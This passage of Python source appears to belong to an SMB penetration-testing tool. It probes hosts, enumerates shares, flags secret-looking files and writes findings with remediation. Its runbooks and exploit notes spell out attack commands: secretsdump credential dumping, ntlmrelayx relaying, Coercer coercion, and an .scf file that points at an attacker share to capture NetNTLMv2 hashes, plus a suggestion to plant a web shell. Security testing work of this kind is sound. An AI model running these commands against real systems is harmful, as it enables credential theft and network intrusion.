                        "Coercer coerce -u <lowpriv> -p <pass> -t <victim-dc> -l <your-ip>. "
                        "On success socks proxies psexec/secretsdump through the relay."),
                    depth_tier="t1"))
            info = pr.get("ntlm_info") if pr else None
            if info:
                bits = []
                for k, label in (("netbios_computer", "NetBIOS name"),
                                 ("netbios_domain", "NetBIOS domain"),
                                 ("dns_computer", "DNS FQDN"),
                                 ("dns_domain", "AD DNS domain"),
                                 ("dns_tree", "AD forest"),
                                 ("os_version", "OS build")):
                    v = info.get(k)
                    if v:
                        bits.append(f"{label}={v}")
                if info.get("server_time_epoch"):
                    import datetime as _dt
                    bits.append("server clock=" + _dt.datetime.fromtimestamp(
                        info["server_time_epoch"], _dt.timezone.utc).isoformat())
                if bits:
                    out.append(_finding(
                        "low",
                        "SMB pre-auth NTLM CHALLENGE leaks host/domain intel", tgt,
                        "SMB2 SESSION_SETUP with an NTLMSSP NEGOTIATE returned a "
                        "CHALLENGE carrying: " + "; ".join(bits) + ". Pre-auth, no "
                        "credentials required. Reveals NetBIOS/DNS naming, AD "
                        "domain and forest, exact OS build for CVE mapping, and "
                        "the server clock (Kerberos skew).",
                        "nxc / impacket",
                        "nxc smb <ip>   # the banner line prints the same NetBIOS "
                        "name, domain and OS build harvested from the CHALLENGE",
                        "Default Windows/Samba behavior; disable NTLM entirely "
                        "(Kerberos-only) where feasible. On dual-stack Windows, "
                        "'Restrict NTLM: Outgoing NTLM traffic to remote servers' "
                        "and the corresponding audit policies help scope exposure.",
                        ["CWE-200"], kind="smb_ntlm_info_disclosure",
                        exploit_note=(
                            "nxc smb <ip> - the banner prints the same fields; then feed "
                            "dns_domain into kerberos, and os_version into a CVE map "
                            "(searchsploit windows <build>)."),
                        depth_tier="t1"))
    return out


# --- runbooks -------------------------------------------------------------------

def _fill(text: str, ip: str, port: int, creds: dict | None) -> str:
    creds = creds or {}
    return (text.replace("<ip>", ip).replace("<port>", str(port))
            .replace("<user>", creds.get("user") or "<user>")
            .replace("<pass>", creds.get("secret") or "<pass>")
            .replace("<domain>", creds.get("domain") or "<domain>"))


def credfree_runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "nmap NSE", "nmap -p445 --script smb-protocols,smb2-security-mode,"
         "smb-vuln-ms17-010,smb-enum-shares <ip>",
         "Dialects, signing posture, MS17-010 status, anonymous shares."),
        ("recon", "enum4linux-ng", "enum4linux-ng -A <ip>",
         "Null-session sweep: domain SID, users, groups, shares, password policy."),
        ("recon", "nxc (null)", "nxc smb <ip> -u '' -p '' --shares --users --pass-pol",
         "Anonymous share/user/policy enumeration."),
        ("recon", "nxc (guest)", "nxc smb <ip> -u 'guest' -p '' --shares",
         "Guest-account share access."),
    ]
    return [{"phase": ph, "tool": t,
             "command": _fill(c, ip, port, None), "why": w}
            for ph, t, c, w in steps]


def cred_runbook(ip: str, port: int, creds: dict | None) -> list[dict]:
    steps = [
        ("enumerate", "nxc smb",
         "nxc smb <ip> -u <user> -p <pass> --shares --users --sessions "
         "--loggedon-users --pass-pol",
         "Authenticated inventory: shares+ACLs, users, sessions, policy."),
        ("enumerate", "nxc spider", "nxc smb <ip> -u <user> -p <pass> -M spider_plus",
         "Recursively index every readable share for secrets/backups."),
        ("loot", "smbclient",
         "smbclient //<ip>/<share> -U '<domain>\\<user>%<pass>' -c 'recurse; ls'",
         "Browse and pull interesting files from a readable share."),
        ("escalate", "secretsdump",
         "impacket-secretsdump '<domain>/<user>:<pass>@<ip>'",
         "If the account is local admin: dump the SAM/LSA secrets (local hashes)."),
        ("escalate", "relay",
         "ntlmrelayx.py -t smb://<ip> -smb2support   # when signing is not required",
         "Relay a coerced/poisoned login to act as the victim on this host."),
    ]
    return [{"phase": ph, "tool": t, "command": _fill(c, ip, port, creds), "why": w}
            for ph, t, c, w in steps]


# --- live tools (nxc / smbclient) -----------------------------------------------

def _tool(*names):
    import shutil
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def smb_tool():
    return _tool("nxc", "netexec", "crackmapexec")


def smbclient_tool():
    return _tool("smbclient")


def _run(cmd, timeout: int = 120) -> tuple[str, str | None]:
    from ..core.util import run_tool
    return run_tool(cmd, timeout)


def enum_session(ip: str, user: str = "", password: str = "",
                 port: int = _DEFAULT_PORT, domain: str = "") -> dict:
    """Run `nxc smb` for a (possibly null/guest/credentialed) session and parse the
    result via the shared credenum parser. Returns {ran, auth, shares, users, passpol,
    error}. `domain` selects domain auth (-d); a real user with no domain is treated
    as a standalone/workgroup LOCAL account (--local-auth) - the common non-AD case."""
    tool = smb_tool()
    if not tool:
        return {"ran": False, "error": "nxc/netexec not installed", "shares": [],
                "users": [], "auth": False}
    cmd = [tool, "smb", ip, "-u", user, "-p", password,
           "--shares", "--users", "--pass-pol"]
    if domain:
        cmd += ["-d", domain]
    elif user and user.lower() != "guest":
        cmd += ["--local-auth"]           # standalone/workgroup local account
    if port and port != _DEFAULT_PORT:
        cmd += ["--port", str(port)]
    out, err = _run(cmd)
    if err:
        return {"ran": True, "error": err, "shares": [], "users": [], "auth": False,
                "output": out}
    from ..creds.credenum import parse_nxc_smb
    data = parse_nxc_smb(out)
    data["ran"] = True
    data["error"] = None
    data["output"] = out
    return data


def enum_best_session(ip: str, port: int = _DEFAULT_PORT,
                      creds: dict | None = None) -> tuple[dict, str]:
    """Enumerate SMB shares with the strongest session that works: null -> guest ->
    operator credentials. Returns (session, level) where level is one of
    "null" | "guest" | "creds" | "none" | "error".

    Anonymous access (null/guest) is itself a FINDING; a credentialed session is just
    an inventory of what an authenticated user can see, so the caller must NOT feed a
    "creds" session to null_session_findings (that would report authenticated access as
    anonymous - a false positive). This closes the gap where a locked-down standalone/
    workgroup host that denies null+guest but has valid creds listed zero shares.
    """
    session = enum_session(ip, "", "", port=port)
    if session.get("error") and "not installed" in (session.get("error") or ""):
        return session, "error"
    if session.get("shares") or session.get("users"):
        return session, "null"
    guest = enum_session(ip, "guest", "", port=port)
    if guest.get("shares") or guest.get("users"):
        return guest, "guest"
    if creds and creds.get("user"):
        c = enum_session(ip, creds["user"], creds.get("secret", ""), port=port,
                         domain=creds.get("domain", ""))
        if c.get("auth") or c.get("shares") or c.get("users"):
            return c, "creds"
    return guest, "none"


# --- share spidering for secrets -------------------------------------------------

# Paths that are worth a tester's attention when readable off a share. Ordered; the
# first match wins so the "why" is the most specific one.
_SECRET_FILE_PATTERNS = [
    (re.compile(r"(?:^|[\\/])(?:auto)?unattend\.xml$|(?:^|[\\/])sysprep\.(?:xml|inf)$", re.I),
     "unattended-install answer file (often holds a local admin password)"),
    (re.compile(r"(?:^|[\\/])Groups\.xml$", re.I),
     "GPP Groups.xml (decryptable cpassword)"),
    (re.compile(r"(?:^|[\\/])web\.config$|(?:^|[\\/])appsettings\.json$", re.I),
     "app config (connection strings / secrets)"),
    (re.compile(r"\.kdbx$", re.I), "KeePass database"),
    (re.compile(r"(?:^|[\\/])id_[rd]sa$|\.ppk$|\.pem$", re.I), "private key"),
    (re.compile(r"(?:^|[\\/])(?:\.pgpass|\.my\.cnf|\.git-credentials|\.npmrc)$", re.I),
     "credential-bearing dotfile"),
    (re.compile(r"(?:pass(?:word)?s?|creds?|secrets?)\.(?:txt|csv|xlsx?|docx?)$", re.I),
     "file named like a credential store"),
    (re.compile(r"\.(?:bak|backup|old|vhdx?|ova|kdb)$", re.I), "backup / disk image"),
]


def flag_secret_files(files: list[str]) -> list[dict]:
    """Given file paths seen on readable shares, return [{path, why}] for the sensitive
    ones (deduped, first pattern wins). Pure - the unit-testable core of spidering."""
    hits: list[dict] = []
    seen: set = set()
    for path in files:
        p = (path or "").strip()
        if not p or p in seen:
            continue
        for rx, why in _SECRET_FILE_PATTERNS:
            if rx.search(p):
                seen.add(p)
                hits.append({"path": p, "why": why})
                break
    return hits


def _parse_smbclient_ls(out: str, share: str) -> list[str]:
    """Extract file paths from `smbclient recurse ON; ls` output. Directory headers are
    lines like '\\dir\\sub'; entries are '  name   A   size   Day Mon ...'."""
    paths: list[str] = []
    cwd = ""
    for line in out.splitlines():
        s = line.rstrip()
        if not s:
            continue
        if s.lstrip().startswith("\\"):                 # a directory header line
            cwd = s.strip().rstrip("\\")
            continue
        m = re.match(r"\s+(.+?)\s+([ADHSRNI]+)\s+\d+\s+\w{3}\s", line)
        if m and "D" not in m.group(2):                 # a file (not a directory entry)
            name = m.group(1).strip()
            if name in (".", ".."):
                continue
            paths.append(f"{share}{cwd}\\{name}")
    return paths


def _smbclient_auth(creds: dict | None) -> list[str]:
    creds = creds or {}
    if not creds.get("user"):
        return ["-N"]
    dom = creds.get("domain") or ""
    who = f"{dom}\\{creds['user']}" if dom else creds["user"]
    return ["-U", f"{who}%{creds.get('secret', '')}"]


def spider_shares(ip: str, shares: list[dict], creds: dict | None = None,
                  port: int = _DEFAULT_PORT, max_shares: int = 12) -> list[dict]:
    """Spider READABLE shares for secret-looking files and return finding-dicts. Uses
    smbclient recursive listing; read-only (it lists, never fetches)."""
    tool = smbclient_tool()
    if not tool:
        return []
    findings: list[dict] = []
    readable = [s for s in shares
                if "READ" in (s.get("perms") or "").upper()
                and (s.get("name") or "").upper() not in ("IPC$", "PRINT$")]
    for s in readable[:max_shares]:
        name = s["name"]
        cmd = [tool, f"//{ip}/{name}"] + _smbclient_auth(creds) + ["-c", "recurse ON; ls"]
        if port and port != _DEFAULT_PORT:
            cmd += ["-p", str(port)]
        out, err = _run(cmd, timeout=90)
        if err:
            continue
        hits = flag_secret_files(_parse_smbclient_ls(out, name))
        if hits:
            listing = "\n".join(f"  {h['path']}  - {h['why']}" for h in hits[:25])
            findings.append({
                "title": f"Sensitive files readable on share '{name}'",
                "target": f"{ip}:{port}", "severity": "high",
                "detail": f"{len(hits)} secret-looking file(s) on //{ip}/{name}:\n{listing}",
                "narrative": "Readable secrets on a share are a direct path to credentials "
                             "or further access without exploiting anything.",
                "remediation": "Restrict the share ACL; remove secrets from file shares; "
                               "rotate any exposed credential.",
                "cwes": ["CWE-200", "CWE-522"], "confidence": "confirmed",
            })
    return findings


def prove_writable(ip: str, share: str, creds: dict | None = None,
                   port: int = _DEFAULT_PORT) -> dict:
    """Reversibly prove a share is writable: drop a marker file, list it, delete it.
    Returns {writable, evidence, command, error}. Never leaves the marker behind."""
    tool = smbclient_tool()
    if not tool:
        return {"writable": False, "error": "smbclient not installed"}
    creds = creds or {}
    marker = f"{_PROBE_MARK}.txt"
    if creds.get("user"):
        dom = creds.get("domain") or ""
        auth = f"{dom}\\{creds['user']}%{creds.get('secret', '')}" if dom \
            else f"{creds['user']}%{creds.get('secret', '')}"
        authflag = ["-U", auth]
    else:
        authflag = ["-N"]                      # anonymous / null
    # Write a temp local file to upload, then put/list/delete on the share.
    import tempfile
    import os
    fd, local = tempfile.mkstemp(prefix="recce_smb_", suffix=".txt")
    try:
        os.write(fd, b"recce-writable-share-proof\n")
        os.close(fd)
        script = f"put {local} {marker}; ls {marker}; del {marker}"
        cmd = [tool, f"//{ip}/{share}"] + authflag + ["-c", script]
        if port and port != _DEFAULT_PORT:
            cmd += ["-p", str(port)]
        out, err = _run(cmd, timeout=60)
    finally:
        try:
            os.unlink(local)
        except OSError:
            pass
    if err:
        return {"writable": False, "error": err, "command": " ".join(cmd)}
    low = out.lower()
    # Judge the WRITE from the put itself, not the whole transcript: smbclient prints
    # "putting file ... as \marker (rate)" only on a successful STOR, and
    # "NT_STATUS_..._DENIED opening remote file" when the put is refused. (Keying off
    # the whole blob would let the trailing `del` result - which can be ACCESS_DENIED
    # on a create-but-not-delete share - flip a real write to a false negative.)
    wrote = "putting file" in low and "opening remote file" not in low
    # Cleanup contract: if the write landed but the in-script `del` was refused, the
    # marker is still on the share - make one more explicit delete attempt so we never
    # leave it behind, and record whether cleanup succeeded.
    cleanup_ok = wrote and "deleting remote file" not in low  # no delete error seen
    if wrote and not cleanup_ok:
        del_cmd = [tool, f"//{ip}/{share}"] + authflag + ["-c", f"del {marker}"]
        if port and port != _DEFAULT_PORT:
            del_cmd += ["-p", str(port)]
        d_out, _d_err = _run(del_cmd, timeout=30)
        cleanup_ok = "nt_status" not in (d_out or "").lower()
        out += "\n" + d_out
    ev = out.strip()
    if wrote and not cleanup_ok:
        ev += (f"\n\n[!] cleanup: the delete of {marker} was refused - the marker may "
               "remain on the share; remove it manually.")
    return {"writable": bool(wrote), "cleanup_ok": bool(cleanup_ok),
            "evidence": ev, "command": " ".join(cmd), "error": None}


def null_session_findings(ip: str, port: int, session: dict) -> list[dict]:
    """Turn a successful null/guest nxc session into findings."""
    out: list[dict] = []
    tgt = f"{ip}:{port}"
    shares = session.get("shares") or []
    users = session.get("users") or []
    if not session.get("ran") or session.get("error"):
        return out
    # A null session that enumerated anything at all is a confirmed anonymous logon.
    if shares or users:
        detail = (f"An anonymous (null) SMB session enumerated {len(shares)} share(s) "
                  f"and {len(users)} user(s) without credentials.")
        out.append(_finding(
            "medium", "SMB null / anonymous session allows enumeration", tgt,
            detail + "  This leaks the share/user inventory and password policy an "
            "attacker uses to build spray lists.", "nxc / enum4linux-ng",
            "nxc smb <ip> -u '' -p '' --shares --users --pass-pol",
            "Restrict anonymous access: RestrictNullSessManagement, "
            "RestrictAnonymous=1; Samba 'restrict anonymous = 2'.",
            ["CWE-306", "CWE-200"], kind="null_session",
            exploit_note=(
                "enum4linux-ng -A <ip>; then rpcclient -U '' -N <ip> and run: "
                "lsaenumsid, lookupnames, samrdump. For GPP: nxc smb <ip> -u '' "
                "-p '' -M gpp_password."),
            depth_tier="t2"))
    # Non-admin readable shares reachable anonymously.
    readable = [s for s in shares if "READ" in (s.get("perms") or "").upper()
                and s.get("name", "").upper() not in ("IPC$", "PRINT$")]
    if readable:
        names = ", ".join(s["name"] for s in readable[:12])
        out.append(_finding(
            "medium", "SMB share readable without credentials", tgt,
            f"Anonymous/guest read access to share(s): {names}. Open shares routinely "
            "hold scripts, backups and configs with embedded secrets.",
            "smbclient", "smbclient //<ip>/<share> -N -c 'recurse; ls'",
            "Remove anonymous READ from non-public shares; review share + NTFS ACLs.",
            ["CWE-200", "CWE-306"], kind="readable_share",
            exploit_note=(
                "smbclient //<ip>/<share> -N -c 'recurse; ls'; then smbget -R "
                "smb://<ip>/<share>. Grep for password, cpassword, connectionstring. "
                "gpp-decrypt any cpassword=... hits."),
            depth_tier="t2"))
    return out


def write_proof_finding(ip: str, port: int, share: str, proof: dict,
                        creds: dict | None) -> dict | None:
    if not proof.get("writable"):
        return None
    anon = "" if (creds and creds.get("user")) else "anonymous/guest "
    return _finding(
        "high", f"Writable SMB share (proven): {share}", f"{ip}:{port}",
        f"recce PROVED write access to \\\\{ip}\\{share} with {anon}access by "
        "dropping a marker file, listing it, then deleting it (fully reversible):\n\n"
        + (proof.get("evidence") or ""),
        "smbclient / Responder",
        # shlex.quote the server-supplied share name: it's attacker-controlled and
        # this string is meant to be copy-pasted into the operator's shell.
        "smbclient //<ip>/" + shlex.quote(share) + " -N -c 'put poison.scf; ls'   # then capture "
        "NetNTLM with Responder; or drop a web shell if the share backs a web root",
        "Remove write access for non-admin/anonymous principals; audit share + NTFS "
        "ACLs.", ["CWE-732", "CWE-276"], kind="writable_share",
        exploit_note=(
            "smbclient //<ip>/<share> -N -c 'put @poisoned.scf; ls'. Content: "
            "[Shell]\\nCommand=2\\nIconFile=\\\\<your-ip>\\pwn.ico\\n[Taskbar]\\n"
            "Command=ToggleDesktop. Then responder -I <iface> -A. Capture the "
            "NetNTLMv2 -> hashcat -m 5600 -> reuse or relay."),
        depth_tier="t2")


# --- proof screenshot -----------------------------------------------------------

def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="# ", banner=banner)


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """SMB findings -> {ip: [Vuln]} (source='smb'), for the main totals + writeups."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "smb", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    """Full offline SMB analysis. Returns {targets, findings, runbooks, stats}.
    When active, runs the stdlib negotiate probe against each target (no creds/tools
    needed); the live tool layer (share enum / write proof) is driven from cmd_smb.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
    from . import svcprobe
    targets = smb_targets(hosts)
    probes: dict = {}
    state: dict = {}
    def _full_probe(t):
        pr = probe(t["ip"], t["port"])
        if pr and pr.get("dialect"):                # SMB2 answered - one more RT for CHALLENGE
            info = probe_ntlm_info(t["ip"], t["port"])
            if info:
                pr["ntlm_info"] = info
        # T2 promotion for the SMBv1-enabled finding: run the MS17-010 wire
        # differentiator ONLY when SMBv1 answered (no point otherwise), a single
        # extra TCP session that reads one NT status. Non-destructive.
        if pr and pr.get("smbv1"):
            ms17 = probe_ms17_010(t["ip"], t["port"])
            if ms17:
                pr["ms17_010"] = ms17
        return pr
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, _full_probe,
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["dialect"] = pr.get("dialect_name", "")
                t["smbv1"] = pr.get("smbv1", False)
                t["signing_required"] = pr.get("signing_required")
                if pr.get("ntlm_info"):
                    t["ntlm_info"] = pr["ntlm_info"]
    fs = findings(hosts, probes)
    runbooks = []
    for t in targets:
        runbooks.append({
            "target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
            "credfree": credfree_runbook(t["ip"], t["port"]),
            "credentialed": cred_runbook(t["ip"], t["port"], creds)})
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
